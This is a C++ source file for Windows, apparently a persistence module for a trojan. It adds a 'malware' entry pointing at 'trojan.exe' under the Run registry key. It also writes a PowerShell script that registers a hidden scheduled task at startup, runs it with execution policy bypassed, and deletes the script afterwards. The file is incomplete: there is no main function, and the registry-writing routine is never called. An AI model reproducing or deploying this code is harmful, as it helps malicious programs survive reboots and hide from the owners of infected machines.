#include <iostream>
#include <windows.h>
#include <tchar.h>
#include <cstdlib>
#include <fstream>
#include <string>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")


bool configureAutoStart(LPCTSTR appName, LPCTSTR appPath) {

    HKEY keyHandle;
    LONG opResult = RegOpenKeyEx(HKEY_CURRENT_USER,
        _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0, KEY_SET_VALUE, &keyHandle);

    if (opResult != ERROR_SUCCESS)
    {
        return false;
    }

    opResult = RegSetValueEx(keyHandle, appName, 0, REG_SZ,
        (BYTE*)appPath, (_tcslen(appPath) + 1) * sizeof(TCHAR));

    RegCloseKey(keyHandle);

    return opResult == ERROR_SUCCESS;
}




bool checkAutoStartEnabled(LPCTSTR appName)
{
    HKEY keyHandle;
    LONG opResult = RegOpenKeyEx(HKEY_CURRENT_USER,
        _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0, KEY_QUERY_VALUE, &keyHandle);

    if (opResult != ERROR_SUCCESS)
    {
        return false;
    }

    opResult = RegQueryValueEx(keyHandle, appName, NULL, NULL, NULL, NULL);
    RegCloseKey(keyHandle);

    return opResult == ERROR_SUCCESS;
}

int setupPersistence() {

    LPCTSTR appAlias = _T("malware");
    LPCTSTR appExecutablePath = _T("C:\\Users\\Sergio\\Desktop\\analizadll\\trojan.exe");

    if (checkAutoStartEnabled(appAlias))
    {
        _tprintf(_T("Auto-start already configured for %s.!!\n"), appAlias);
        return 1;
    }
    return 0;
}

void setupAndRunScheduledTask() {


    std::string scriptFilename = "ScheduledTaskScript.ps1";
    std::ofstream scriptFile(scriptFilename);

    if (!scriptFile.is_open()) {
        std::cerr << "Failed to open file for writing." << std::endl;
        return;
    }
    scriptFile << "$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n\n";
    scriptFile << "$Action = New-ScheduledTaskAction -Execute \"Ruta\\de\\tu\\aplicación.exe\"\n\n";
    scriptFile << "$Trigger = New-ScheduledTaskTrigger -AtStartup\n\n";
    scriptFile << "$Principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive\n\n";
    scriptFile << "$Settings = New-ScheduledTaskSettingsSet -Hidden\n\n";
    scriptFile << "$Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger -Settings $Settings\n\n";
    scriptFile << "Register-ScheduledTask \"NombreDeLaTarea\" -InputObject $Task\n";

    scriptFile.close();

    std::cout << "PS1 file succesfully created!!: " << scriptFilename << std::endl;
    std::string cmd = "PowerShell -ExecutionPolicy Bypass -File " + scriptFilename;

    system(cmd.c_str());

    if (remove(scriptFilename.c_str()) != 0) {
        std::perror("Error deleting the file");
    }
    else {
        std::cout << "PS1 file successfully deleted!" << std::endl;
    }

}
